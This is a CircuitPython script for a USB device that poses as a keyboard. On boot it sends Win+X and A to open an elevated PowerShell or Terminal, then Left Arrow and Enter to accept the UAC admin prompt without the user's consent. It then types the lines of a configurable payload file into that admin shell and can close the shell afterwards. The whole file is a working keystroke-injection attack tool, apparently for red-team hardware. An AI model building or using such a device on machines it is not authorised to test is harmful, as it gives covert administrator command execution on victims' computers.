import sys

sys.path.insert(0, "/scripts")

import board
import displayio
import adafruit_imageload
import supervisor
import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

import device_config

cfg = device_config.load()

display = board.DISPLAY
main_group = displayio.Group()
display.root_group = main_group

try:
    bitmap, palette = adafruit_imageload.load(
        "images/logishell.png",
        bitmap=displayio.Bitmap,
        palette=displayio.Palette,
    )
    main_group.append(displayio.TileGrid(bitmap, pixel_shader=palette))
except Exception:
    pass


def type_payload_file(layout, path):
    with open(path, "r") as f:
        for line in f:
            stripped = line.lstrip()
            if not stripped or stripped.startswith("#"):
                continue
            layout.write(line.rstrip("\r\n"))
            layout.write("\n")
            time.sleep(0.05)


def close_shell(layout):
    time.sleep(cfg["close_shell_delay"])
    layout.write("exit\n")


def may_autorun_payload():
    if not cfg["autorun_on_boot"]:
        return False
    return supervisor.runtime.run_reason == supervisor.RunReason.STARTUP


kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)
payload_done = not may_autorun_payload()
start_time = time.monotonic()
wait_sec = cfg["boot_wait_time"]

while True:
    if not payload_done and (time.monotonic() - start_time) > wait_sec:
        try:
            kbd.send(Keycode.GUI, Keycode.X)
            time.sleep(0.6) #change the Keystroke delay to get into powershell if you want to.
            kbd.send(Keycode.A)
            time.sleep(0.6)
            kbd.send(Keycode.LEFT_ARROW)
            time.sleep(0.6)
            kbd.send(Keycode.ENTER)
            time.sleep(cfg["shell_wait"])
            type_payload_file(layout, cfg["payload_file"])
            if cfg["close_shell_after_payload"]:
                close_shell(layout)
            payload_done = True
        except Exception:
            pass

    time.sleep(0.5)
